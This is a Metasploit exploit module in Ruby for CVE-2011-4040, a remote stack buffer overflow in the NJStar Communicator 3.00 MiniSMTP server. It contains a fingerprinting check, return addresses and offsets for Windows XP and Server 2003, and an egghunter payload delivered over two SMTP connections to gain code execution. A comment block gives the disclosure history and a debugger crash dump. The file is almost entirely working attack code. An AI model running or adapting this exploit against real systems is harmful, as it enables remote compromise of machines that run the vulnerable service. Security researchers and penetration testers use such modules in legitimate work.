##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'NJStar Communicator 3.00 MiniSMTP Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow vulnerability in NJStar Communicator
				Version 3.00 MiniSMTP server.  The MiniSMTP application can be seen in multiple
				NJStar products, and will continue to run in the background even if the
				software is already shutdown.  According to the vendor's testimonials,
				NJStar software is also used by well known companies such as Siemens, NEC,
				Google, Yahoo, eBay; government agencies such as the FBI, Department of
				Justice (HK); as well as a long list of universities such as Yale, Harvard,
				University of Tokyo, etc.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Dillon Beresford', # Original discovery and MSF Module.
				],
			'References'     =>
				[
					[ 'OSVDB', '76728' ],
					[ 'CVE', '2011-4040' ],
					[ 'URL', 'http://www.njstar.com/cms/njstar-communicator' ],
					[ 'EDB', '18057' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Platform'       => 'win',
			'Payload'        =>
				{
					'BadChars' => "\x00",
					'StackAdjustment' => -1500,
				},
			'Targets'        =>
				[
					[
						'Windows XP SP2/SP3',
						{
							'Ret'    => 0x77c35459, # PUSH ESP; RETN (MSVCRT.dll)
							'Offset' => 247,
						}
					],
					[
						# Can't test patch level on this one, because you can't
						# even update Win2k3 SP0 anymore from Windows Update
						'Windows Server 2003 SP0',
						{
							'Ret'    => 0x77d20738, # JMP ESP (USER32.dll)
							'Offset' => 247,
						}
					],
					[
						'Windows Server 2003 SP1/SP2',
						{
							'Ret'    => 0x77BE2265, # PUSH ESP; RETN (MSVCRT.dll)
							'Offset' => 247,
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 31 2011',
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(25)], self.class)
	end

	def check
		connect
		# We get a response like: "220 [host-name] Service Ready"
		# But we don't really care about this one
		res = sock.get_once(-1, 5)
		vprint_status("Banner: #{res.to_s.chop}")

		sock.puts("HELP\r\n")

		# But the HELP response will tell us if this is a NJStar SMTP or not
		res = sock.get_once(-1, 5)
		vprint_status("HELP Response: #{res.to_s.chop}")
		disconnect

		# I can only flag it as "Detected" because it doesn't return a version
		if res =~ /Windows E-mail Server From NJStar Software/i
			return Exploit::CheckCode::Detected
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		eggoptions =
		{
			:checksum => true,
			:eggtag => "w00t"
		}

		hunter,egg = generate_egghunter(payload.encoded,payload_badchars,eggoptions)

		buffer = rand_text(target['Offset'])
		buffer << [target.ret].pack('V')
		buffer << hunter
		buffer << make_nops(4)

		# Just some debugging output so we can see lengths and byte size of each of our buffer.
		vprint_status("egg: %u bytes: \n" % egg.length + Rex::Text.to_hex_dump(egg))
		vprint_status("hunter: %u bytes: \n" % hunter.length + Rex::Text.to_hex_dump(hunter))
		vprint_status("buffer: %u bytes:\n" % buffer.length + Rex::Text.to_hex_dump(buffer))

		print_status("Trying target #{target.name}...")

		# har har har you get trick no treat...
		# we dont have very much space so we
		# send our egg in a seperate connection
		connect

		print_status("Sending the egg...")
		sock.put(egg)

		# I think you betta call, ghostbusters...
		# now we send our evil buffer along with the
		# egg hunter, we are doing multiple connections
		# to solve the issue with limited stack space.
		# thanks to bannedit for advice on threads and
		# making multiple connections to get around
		# stack space constraints. :)
		connect

		print_status("Sending our buffer containing the egg hunter...")
		sock.put(buffer)

		handler
		disconnect
	end
end


=begin
Dillon Beresford
https://twitter.com/#!/D1N

NJStar Communicator
Version: 3.00 and prior
Build: 11818 and prior

Tested minismtp version:
1.30.0.60218

Shouts to bannedit, sinn3r, rick2600, tmanning, corelanc0d3r, jcran,
manils, d0tslash, mublix, halsten, and everyone at AHA!

No response as of 10/31/11 from AUSCERT or the software vendor. CNCERT and USCERT responded
on 10/30/11 and 10/31/11, CNCERT said in an email they needed to see if the vulnerability
is remotely exploitable and needed more verification. I sent a proof of concept exploit
in python with remote code execution. So, here is the proof that the bug is, in fact,
remotely exploitable. WIN!

System DLLs are used for target.ret because minismtp.exe is the only NJStar component in
memory, and its base starts with a 0x00, that's no good.  However, if your target machine
started minismtp from the Windows start menu (Start -> All Programs -> NJStar Communicator
-> NJStar MiniSmtp), it'd actually load up more DLLs. And one of them -- MSVCR100.dll -- is
ideal enough to use (No rebase, starts with a high address, but there is an ASLR flag).

eax=00000000 ebx=00417bf8 ecx=00002745 edx=00000000 esi=008a3e50
edi=008a3d80
eip=42424242 esp=00ccff70 ebp=7c8097d0 iopl=0          nv up ei pl nz na pe nc
cs=001b	 ss=0023  ds=0023  es=0023	fs=003b	 gs=0000
efl=00010206
42424242 ??     ???
0:003> !exchain
image00400000+bbc4 (0040bbc4)
00ccff00: 41414141
Invalid exception stack at 41414141
0:003> d esp
00ccff70  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
00ccff80  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
00ccff90  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
00ccffa0  44 44 44 44 00 ff cc 00-c4 bb 40 00 20 23 41 00  DDDD......@. #A.
00ccffb0  00 00 00 00 ec ff cc 00-29 b7 80 7c b8 3d 8a 00  ........)..|.=..
00ccffc0  00 00 00 00 00 00 00 00-b8 3d 8a 00 00 c0 fd 7f  .........=......
00ccffd0  00 d6 e3 89 c0 ff cc 00-98 08 99 89 ff ff ff ff  ................
00ccffe0  d8 9a 83 7c 30 b7 80 7c-00 00 00 00 00 00 00 00  ...|0..|........

=end
